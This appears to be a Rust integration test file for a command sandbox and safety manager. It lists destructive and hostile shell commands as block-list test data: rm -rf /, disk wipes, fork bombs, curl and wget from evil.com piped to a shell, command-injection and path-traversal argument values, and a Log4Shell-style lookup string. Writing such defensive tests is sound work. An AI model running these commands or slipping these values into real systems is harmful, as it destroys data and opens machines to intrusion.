// Production-ready integration tests for battle-tested scenarios

#[cfg(test)]
mod production_tests {
    use infrastructure::sandbox::{Sandbox, ConfirmationManager};
    use infrastructure::safety::SafetyManager;
    use std::collections::HashMap;

    #[tokio::test]
    async fn test_comprehensive_security_audit() {
        let sandbox = Sandbox::new();
        let safety = SafetyManager::new();
        let confirm = ConfirmationManager::new();

        // Test all known dangerous commands and patterns
        let dangerous_scenarios = vec![
            // System destruction
            ("rm", vec!["-rf", "/"]),
            ("rm", vec!["-rf", "/*"]),
            ("mkfs", vec!["ext4", "/dev/sda"]),
            ("dd", vec!["if=/dev/zero", "of=/dev/sda"]),

            // Fork bombs
            ("bash", vec!["-c", ":(){ :|:& }; :"]),
            (":", vec!["(){", ":|:&", "};", ":"]),

            // Privilege escalation
            ("sudo", vec!["rm", "-rf", "/"]),
            ("su", vec!["root", "-c", "rm -rf /"]),

            // Network attacks
            ("curl", vec!["http://evil.com", "|", "bash"]),
            ("wget", vec!["http://evil.com/script", "-O", "-", "|", "sh"]),

            // System manipulation
            ("mount", vec!["/dev/sda1", "/mnt"]),
            ("umount", vec!["/"]),
            ("chmod", vec!["777", "/etc/passwd"]),

            // Process killing
            ("kill", vec!["-9", "1"]), // Kill init
            ("pkill", vec!["-9", "systemd"]),
        ];

        for (cmd, args) in dangerous_scenarios {
            let args_str: Vec<String> = args.into_iter().map(String::from).collect();

            // Sandbox should block
            assert!(sandbox.test_command(cmd, &args_str).is_err(),
                "Sandbox should block dangerous command: {} {:?}", cmd, args_str);

            // Safety manager should block
            assert!(safety.check_command(cmd, &args_str).await.is_err(),
                "Safety manager should block dangerous command: {} {:?}", cmd, args_str);
        }

        println!("✅ All dangerous commands properly blocked");
    }

    #[tokio::test]
    async fn test_production_workflows() {
        let sandbox = Sandbox::new();

        // Test common production development workflows
        let safe_workflows = vec![
            // Rust development
            ("cargo", vec!["check"]),
            ("cargo", vec!["build", "--release"]),
            ("cargo", vec!["test"]),
            ("rustc", vec!["--version"]),

            // Git operations
            ("git", vec!["status"]),
            ("git", vec!["add", "."]),
            ("git", vec!["commit", "-m", "test"]),
            ("git", vec!["log", "--oneline"]),

            // System monitoring
            ("ps", vec!["aux"]),
            ("top", vec!["-b", "-n", "1"]),
            ("df", vec!["-h"]),
            ("free", vec!["-h"]),
            ("uptime", vec![]),

            // File operations (safe)
            ("ls", vec!["-la"]),
            ("cat", vec!["/etc/hostname"]),
            ("find", vec![".", "-name", "*.rs", "-type", "f"]),
            ("grep", vec!["pattern", "file.txt"]),

            // Development tools
            ("which", vec!["cargo"]),
            ("pwd", vec![]),
            ("echo", vec!["Hello, World!"]),
        ];

        for (cmd, args) in safe_workflows {
            let args_str: Vec<String> = args.into_iter().map(String::from).collect();

            assert!(sandbox.test_command(cmd, &args_str).is_ok(),
                "Safe command should be allowed: {} {:?}", cmd, args_str);
        }

        println!("✅ All production workflows properly allowed");
    }

    #[tokio::test]
    async fn test_edge_case_handling() {
        let sandbox = Sandbox::new();
        let safety = SafetyManager::new();

        // Test edge cases that could cause issues
        let edge_cases = vec![
            // Empty commands
            ("", vec![]),
            ("ls", vec![""]),

            // Very long arguments
            ("echo", vec!["a".repeat(10000)]),

            // Special characters
            ("ls", vec!["file; rm -rf /"]),
            ("ls", vec!["file && rm -rf /"]),
            ("ls", vec!["file || rm -rf /"]),

            // Path traversal
            ("cat", vec!["../../../etc/passwd"]),
            ("ls", vec!["/etc/../etc/passwd"]),

            // Command injection attempts
            ("ls", vec!["$(rm -rf /)"]),
            ("ls", vec!["`rm -rf /`"]),

            // Unicode and special encoding
            ("ls", vec!["\u{202e}file.txt"]), // Right-to-left override
            ("ls", vec!["file.txt%00"]), // Null byte injection

            // Buffer overflow attempts
            ("ls", vec!["a".repeat(100000)]),
        ];

        for (cmd, args) in edge_cases {
            let args_str: Vec<String> = args.into_iter().map(String::from).collect();

            // These should all be blocked or handled safely
            let sandbox_result = sandbox.test_command(cmd, &args_str);
            let safety_result = safety.check_command(cmd, &args_str).await;

            // At minimum, they shouldn't cause panics
            // Some might be allowed, some blocked - that's OK as long as no crashes
            assert!(sandbox_result.is_ok() || sandbox_result.is_err(),
                "Edge case should not cause panic: {} {:?}", cmd, args_str);
            assert!(safety_result.is_ok() || safety_result.is_err(),
                "Edge case should not cause panic: {} {:?}", cmd, args_str);
        }

        println!("✅ All edge cases handled without crashes");
    }

    #[tokio::test]
    async fn test_resource_limits_enforcement() {
        let mut sandbox = Sandbox::new();

        // Configure strict resource limits
        sandbox.configure(std::time::Duration::from_millis(10), 100); // 10ms timeout, 100 bytes output

        // Test timeout enforcement
        let result = sandbox.execute_safe("sleep", &["1".to_string()]).await;
        assert!(result.is_err(), "Should timeout with strict limits");

        // Test output size limits
        let result = sandbox.execute_safe("dd", &["if=/dev/zero".to_string(), "bs=1".to_string(), "count=1000".to_string()]).await;
        // This should either be blocked or limited
        assert!(result.is_ok() || result.is_err(), "Output size should be controlled");

        println!("✅ Resource limits properly enforced");
    }

    #[tokio::test]
    async fn test_concurrent_safety() {
        let sandbox = Sandbox::new();
        let safety = SafetyManager::new();

        // Test concurrent execution safety
        let mut handles = vec![];

        for i in 0..10 {
            let sandbox_clone = sandbox.clone();
            let safety_clone = safety.clone();

            let handle = tokio::spawn(async move {
                // Test various operations concurrently
                let _ = sandbox_clone.test_command("ls", &["-la".to_string()]);
                let _ = safety_clone.check_command("echo", &[format!("test{}", i)]).await;
            });

            handles.push(handle);
        }

        // Wait for all concurrent operations
        for handle in handles {
            assert!(handle.await.is_ok(), "Concurrent operation should not fail");
        }

        println!("✅ Concurrent operations handled safely");
    }

    #[tokio::test]
    async fn test_configuration_persistence() {
        let mut sandbox = Sandbox::new();

        // Test configuration changes
        let original_stats = sandbox.get_stats();

        sandbox.configure(std::time::Duration::from_secs(120), 5 * 1024 * 1024);
        sandbox.allow_command("custom_tool".to_string());
        sandbox.block_command("dangerous_cmd".to_string());

        let new_stats = sandbox.get_stats();

        // Verify configuration changes
        assert_ne!(original_stats["max_execution_time_secs"], new_stats["max_execution_time_secs"]);
        assert_ne!(original_stats["max_output_size_kb"], new_stats["max_output_size_kb"]);

        // Verify command lists changed
        assert!(sandbox.test_command("custom_tool", &[]).is_ok());
        assert!(sandbox.test_command("dangerous_cmd", &[]).is_err());

        println!("✅ Configuration changes properly applied");
    }

    #[tokio::test]
    async fn test_battle_hardened_scenarios() {
        let sandbox = Sandbox::new();
        let safety = SafetyManager::new();
        let confirm = ConfirmationManager::new();

        // Test scenarios inspired by real-world security incidents
        let battle_scenarios = vec![
            // Log4Shell-like attempts
            ("java", vec!["-jar", "app.jar", "-Dlog4j.config=${jndi:ldap://evil.com}"]),

            // Path traversal attacks
            ("cat", vec!["../../../../../../etc/passwd"]),

            // Command injection through environment
            ("env", vec!["PATH=/tmp:$PATH", "rm -rf /"]),

            // Buffer overflow attempts
            ("python", vec!["-c", "print('A' * 1000000)"]),

            // Race condition attempts (rapid successive calls)
            ("touch", vec!["/tmp/test1"]),
            ("rm", vec!["/tmp/test1"]),
        ];

        for (cmd, args) in battle_scenarios {
            let args_str: Vec<String> = args.into_iter().map(String::from).collect();

            // Should be blocked or heavily restricted
            let sandbox_result = sandbox.test_command(cmd, &args_str);
            let safety_result = safety.check_command(cmd, &args_str).await;

            // Critical: Should not allow unrestricted access
            if cmd == "rm" || cmd == "dd" || args_str.iter().any(|arg| arg.contains("/etc") || arg.contains("/dev")) {
                assert!(sandbox_result.is_err() || safety_result.is_err(),
                    "Critical operation should be blocked: {} {:?}", cmd, args_str);
            }
        }

        // Test that critical operations require confirmation
        assert!(confirm.requires_confirmation("delete", "/production/database.db"));
        assert!(confirm.requires_confirmation("format", "/dev/sda"));
        assert!(confirm.requires_confirmation("shutdown", "system"));

        println!("✅ Battle-hardened scenarios properly defended");
    }

    #[tokio::test]
    async fn test_performance_under_load() {
        let sandbox = Sandbox::new();
        let safety = SafetyManager::new();

        let start = std::time::Instant::now();

        // Simulate high-frequency operations
        for i in 0..1000 {
            let _ = sandbox.test_command("echo", &[format!("test{}", i)]);
            let _ = safety.check_command("ls", &["-la".to_string()]).await;
        }

        let elapsed = start.elapsed();

        // Should complete within reasonable time (allowing for rate limiting)
        assert!(elapsed < std::time::Duration::from_secs(30),
            "Performance test took too long: {:?}", elapsed);

        println!("✅ High-load performance acceptable: {:?}", elapsed);
    }

    #[tokio::test]
    async fn test_comprehensive_audit_trail() {
        let safety = SafetyManager::new();

        // Perform various operations to generate audit trail
        let _ = safety.check_command("ls", &["-la".to_string()]).await;
        let _ = safety.check_command("rm", &["-rf".to_string(), "/".to_string()]).await; // Should be blocked
        let _ = safety.check_command("echo", &["test".to_string()]).await;

        // Check that audit trail contains expected entries
        let history = safety.get_command_history(10).await;
        assert!(!history.is_empty(), "Audit trail should contain entries");

        let stats = safety.get_stats().await;
        assert!(stats["total_commands_executed"].parse::<u64>().unwrap() >= 1);
        assert!(stats["total_commands_blocked"].parse::<u64>().unwrap() >= 1);

        println!("✅ Comprehensive audit trail maintained");
    }
}